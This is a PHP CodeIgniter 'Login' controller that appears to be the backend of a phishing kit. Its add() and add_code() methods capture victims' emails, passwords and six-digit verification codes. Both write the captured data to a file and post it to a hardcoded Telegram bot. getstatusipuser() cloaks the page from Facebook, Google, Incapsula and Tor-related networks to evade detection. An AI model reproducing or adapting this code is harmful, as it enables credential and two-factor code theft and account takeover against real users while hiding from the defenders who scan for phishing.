<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/userguide3/general/urls.html
	 */
	public function index()
	{
		if (getenv('HTTP_CLIENT_IP'))
			$ipaddress = getenv('HTTP_CLIENT_IP');
		else if (getenv('HTTP_X_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
		else if (getenv('HTTP_X_FORWARDED'))
			$ipaddress = getenv('HTTP_X_FORWARDED');
		else if (getenv('HTTP_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_FORWARDED_FOR');
		else if (getenv('HTTP_FORWARDED'))
			$ipaddress = getenv('HTTP_FORWARDED');
		else if (getenv('REMOTE_ADDR'))
			$ipaddress = getenv('REMOTE_ADDR');
		else
			$ipaddress = 'UNKNOWN';

		$newip = explode(',', $ipaddress);
		$ipbaru = $newip[0];

		if ($this->getstatusipuser($ipbaru) == "aman") {
			$this->load->view('swift');
			// $this->load->helper('url');
			// redirect('welcome/login/', 'location');
		} else {
			echo "";
		}
	}

	public function code()
	{
		if (getenv('HTTP_CLIENT_IP'))
			$ipaddress = getenv('HTTP_CLIENT_IP');
		else if (getenv('HTTP_X_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
		else if (getenv('HTTP_X_FORWARDED'))
			$ipaddress = getenv('HTTP_X_FORWARDED');
		else if (getenv('HTTP_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_FORWARDED_FOR');
		else if (getenv('HTTP_FORWARDED'))
			$ipaddress = getenv('HTTP_FORWARDED');
		else if (getenv('REMOTE_ADDR'))
			$ipaddress = getenv('REMOTE_ADDR');
		else
			$ipaddress = 'UNKNOWN';

		$newip = explode(',', $ipaddress);
		$ipbaru = $newip[0];

		if ($this->getstatusipuser($ipbaru) == "aman") {
			$this->load->view('swift-code');
			// $this->load->helper('url');
			// redirect('welcome/login/', 'location');
		} else {
			echo "";
		}
	}

	function add()
	{
		$this->load->helper('file');
		$ip   = getenv("REMOTE_ADDR");
		$data = "========================================================================================\nEmail : " . $this->input->post('email') . "\nPassword : " . $this->input->post('password') . "\nDate : " . date("Y-m-d h:i:sa") . "\nhttp://www.geoiptool.com/?IP=" . $ip . "\n========================================================================================\n\n";
		if (write_file('./assets/j645tw.txt', $data, 'a')) {
			$API = "https://api.telegram.org/bot5414289740:AAFAw9X-SewMHGV46faemJJPM7hoU2rFrXs/sendmessage?chat_id=-1001554509064&text=" . urlencode($data) . "";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
			curl_setopt($ch, CURLOPT_URL, $API);
			$result = curl_exec($ch);
			curl_close($ch);

			echo true;
		} else {
			echo false;
		}
	}

	function add_code()
	{
		$this->load->helper('file');
		$ip   = getenv("REMOTE_ADDR");
		$data = "========================================================================================\nVerification : " . $this->input->post('code1') . "" . $this->input->post('code2') . "" . $this->input->post('code3') . "" . $this->input->post('code4') . "" . $this->input->post('code5') . "" . $this->input->post('code6') . "\nDate : " . date("Y-m-d h:i:sa") . "\nhttp://www.geoiptool.com/?IP=" . $ip . "\n========================================================================================\n\n";
		if (write_file('./assets/j645tw.txt', $data, 'a')) {
			$hamba = [''];
			$API = "https://api.telegram.org/bot5414289740:AAFAw9X-SewMHGV46faemJJPM7hoU2rFrXs/sendmessage?chat_id=-1001554509064&text=" . urlencode($data) . "";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
			curl_setopt($ch, CURLOPT_URL, $API);
			$result = curl_exec($ch);
			curl_close($ch);

			echo true;
		} else {
			echo false;
		}
	}

	public function getstatusipuser($ipbaru)
	{
		$ip = json_decode(file_get_contents(sprintf('https://ip.nf/%s.json', $ipbaru)));
		$myisp = strtolower($ip->ip->asn);
		$ispfb = "zwiebelfreunde";
		$word = "facebook";
		$word2 = "incapsula";
		$word3 = "google";
		if (strpos($myisp, $word) !== FALSE) {
			$status = "tidakaman";
		} elseif (strpos($myisp, $word2) !== FALSE) {
			$status = "tidakaman";
		} elseif (strpos($myisp, $ispfb) !== FALSE) {
			$status = "tidakaman";
		} elseif (strpos($myisp, $word3) !== FALSE) {
			$status = "tidakaman";
		} else {
			$status = "aman";
		}
		return $status;
	}
}
